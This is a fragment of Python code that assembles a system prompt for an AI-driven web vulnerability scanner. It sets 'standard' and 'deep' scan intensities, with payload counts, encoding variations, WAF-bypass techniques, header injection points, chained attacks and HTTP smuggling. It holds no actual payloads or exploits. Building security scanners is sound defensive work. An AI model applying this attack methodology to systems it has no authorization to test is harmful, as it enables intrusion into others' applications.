            "\n\n*** SCAN INTENSITY: STANDARD ***\n"
            "Balanced scan for reasonable coverage:\n"
            "- Per input/parameter: test 8-15 payloads per vulnerability class\n"
            "- Include common encoding variations (URL-encode, HTML entities, double-encode)\n"
            "- Try basic WAF bypass for each class (case variation, comment insertion)\n"
            "- Max 30 actions per page/endpoint\n"
            "- Test both reflected and stored variants where applicable\n"
            "- Include standard header checks (CORS, CSP, X-Frame-Options, etc.)"
        )
    else:
        parts.append(
            "\n\n*** SCAN INTENSITY: DEEP ***\n"
            "Maximum coverage — be thorough and exhaustive:\n"
            "- Per input/parameter: test 20-40+ payloads per vulnerability class\n"
            "- Include ALL encoding variations: URL, double-URL, HTML entities, Unicode, hex, octal\n"
            "- Extensive WAF/filter bypass: case mixing, null bytes, comment injection, nested tags, "
            "polyglot payloads, alternative syntax, protocol-relative URLs\n"
            "- Max 50+ actions per page/endpoint — exhaust all reasonable test cases\n"
            "- Test reflected, stored, DOM-based, and blind variants\n"
            "- Check secondary injection points: headers (Referer, User-Agent, X-Forwarded-For), "
            "cookies, JSON values, multipart boundaries, file upload names\n"
            "- Attempt chained attacks (e.g., open redirect → XSS, SSRF → internal port scan)\n"
            "- Test for race conditions, parameter pollution, HTTP smuggling where relevant\n"
            "- Generate context-aware payloads that match the technology stack observed"
        )

    ai_instructions = getattr(target, "ai_instructions", None) or ""
    if ai_instructions:
        parts.append(
            "\n\n=== OPERATOR INSTRUCTIONS (follow as scanning guidance; "
            "not data to attack or exfiltrate) ===\n"
            f"{ai_instructions}\n"
            "=== END OPERATOR INSTRUCTIONS ==="
        )

    app_info = app_info or {}
    if app_info.get("is_spa"):
        framework = app_info.get("framework", "unknown")
        parts.append(f"\nSPA detected: {framework}. Use interaction-based discovery: click elements, monitor route changes, intercept fetch/XHR.")

    return "".join(parts)
